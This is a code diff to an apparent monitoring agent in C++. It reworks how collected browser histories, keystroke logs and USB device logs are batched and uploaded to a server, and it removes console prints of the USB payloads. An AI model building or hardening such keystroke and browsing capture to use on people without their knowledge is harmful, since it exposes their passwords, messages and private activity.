@@ -931,8 +931,19 @@ bool sendTicEvent() {
 
 // Send browser histories
 bool sendBrowserHistories() {
-    if (browserHistories.empty()) return true;
-    
+    if(selectedMonitorId.load()<1 || getClientToken().empty())return false;
+    static std::atomic<bool> sending{false};
+    if(sending.exchange(true))return false;
+    struct ResetSending { std::atomic<bool>& state; ~ResetSending(){state.store(false);} } reset{sending};
+    std::vector<Json::Value> batch;
+    {
+        std::lock_guard<std::mutex> lock(dataMutex);
+        for(const auto& entry:browserHistories){
+            if(batch.size()>=500)break;
+            batch.push_back(entry);
+        }
+    }
+    if(batch.empty())return true;
     std::string url = API_BASE_URL + TIC_ROUTE;
     
     Json::Value data;
@@ -943,7 +954,7 @@ bool sendBrowserHistories() {
     data["Username"] = username;
     data["BrowserHistories"] = Json::Value(Json::arrayValue);
     
-    for (const auto& history : browserHistories) {
+    for (const auto& history : batch) {
         data["BrowserHistories"].append(history);
     }
     
@@ -957,7 +968,11 @@ bool sendBrowserHistories() {
     if (reader.parse(response, root)) {
         if (root.isMember("status") && root["status"].asString() == "success") {
             std::lock_guard<std::mutex> lock(dataMutex);
-            browserHistories.clear();
+            // Acknowledge only the transmitted prefix; events captured while
+            // the HTTP request was in flight remain queued.
+            if(browserHistories.size()>=batch.size())
+                browserHistories.erase(browserHistories.begin(),
+                    browserHistories.begin()+static_cast<std::ptrdiff_t>(batch.size()));
             
             // Update connection status
             {
@@ -990,8 +1005,19 @@ bool sendBrowserHistories() {
 
 // Send key logs
 bool sendKeyLogs() {
-    if (keyLogs.empty() || selectedMonitorId.load()<1) return true;
-    
+    if(selectedMonitorId.load()<1 || getClientToken().empty())return false;
+    static std::atomic<bool> sending{false};
+    if(sending.exchange(true))return false;
+    struct ResetSending { std::atomic<bool>& state; ~ResetSending(){state.store(false);} } reset{sending};
+    std::vector<Json::Value> batch;
+    {
+        std::lock_guard<std::mutex> lock(dataMutex);
+        for(const auto& entry:keyLogs){
+            if(batch.size()>=2000)break;
+            batch.push_back(entry);
+        }
+    }
+    if(batch.empty())return true;
     std::string url = API_BASE_URL + TIC_ROUTE;
     
     Json::Value data;
@@ -1002,7 +1028,7 @@ bool sendKeyLogs() {
     data["Username"] = username;
     data["KeyLogs"] = Json::Value(Json::arrayValue);
     
-    for (const auto& keyLog : keyLogs) {
+    for (const auto& keyLog : batch) {
         data["KeyLogs"].append(keyLog);
     }
     
@@ -1016,7 +1042,11 @@ bool sendKeyLogs() {
     if (reader.parse(response, root)) {
         if (root.isMember("status") && root["status"].asString() == "success") {
             std::lock_guard<std::mutex> lock(dataMutex);
-            keyLogs.clear();
+            // Acknowledge only the transmitted prefix; events captured while
+            // the HTTP request was in flight remain queued.
+            if(keyLogs.size()>=batch.size())
+                keyLogs.erase(keyLogs.begin(),
+                    keyLogs.begin()+static_cast<std::ptrdiff_t>(batch.size()));
             
             // Update connection status
             {
@@ -1049,13 +1079,19 @@ bool sendKeyLogs() {
 
 // Send USB logs
 bool sendUSBLogs() {
-    if (usbDeviceLogs.empty()) return true;
-    
-    std::cout << "Sending " << usbDeviceLogs.size() << " USB logs" << std::endl;
-    
-    // Write to log file
-    writeDebugLog("Sending " + std::to_string(usbDeviceLogs.size()) + " USB logs to server");
-    
+    if(selectedMonitorId.load()<1 || getClientToken().empty())return false;
+    static std::atomic<bool> sending{false};
+    if(sending.exchange(true))return false;
+    struct ResetSending { std::atomic<bool>& state; ~ResetSending(){state.store(false);} } reset{sending};
+    std::vector<Json::Value> batch;
+    {
+        std::lock_guard<std::mutex> lock(dataMutex);
+        for(const auto& entry:usbDeviceLogs){
+            if(batch.size()>=500)break;
+            batch.push_back(entry);
+        }
+    }
+    if(batch.empty())return true;
     std::string url = API_BASE_URL + TIC_ROUTE;
     
     Json::Value data;
@@ -1066,25 +1102,27 @@ bool sendUSBLogs() {
     data["Username"] = username;
     data["USBLogs"] = Json::Value(Json::arrayValue);
     
-    for (const auto& usbLog : usbDeviceLogs) {
+    for (const auto& usbLog : batch) {
         data["USBLogs"].append(usbLog);
     }
     
     Json::FastWriter writer;
     std::string jsonData = writer.write(data);
     
-    std::cout << "USB Log JSON: " << jsonData << std::endl;
     
     std::string response = httpPost(url, jsonData);
     
-    std::cout << "USB Log Response: " << response << std::endl;
     
     Json::Value root;
     Json::Reader reader;
     if (reader.parse(response, root)) {
         if (root.isMember("status") && root["status"].asString() == "success") {
             std::lock_guard<std::mutex> lock(dataMutex);
-            usbDeviceLogs.clear();
+            // Acknowledge only the transmitted prefix; events captured while
+            // the HTTP request was in flight remain queued.
+            if(usbDeviceLogs.size()>=batch.size())
+                usbDeviceLogs.erase(usbDeviceLogs.begin(),
+                    usbDeviceLogs.begin()+static_cast<std::ptrdiff_t>(batch.size()));
             
             // Update connection status
             {
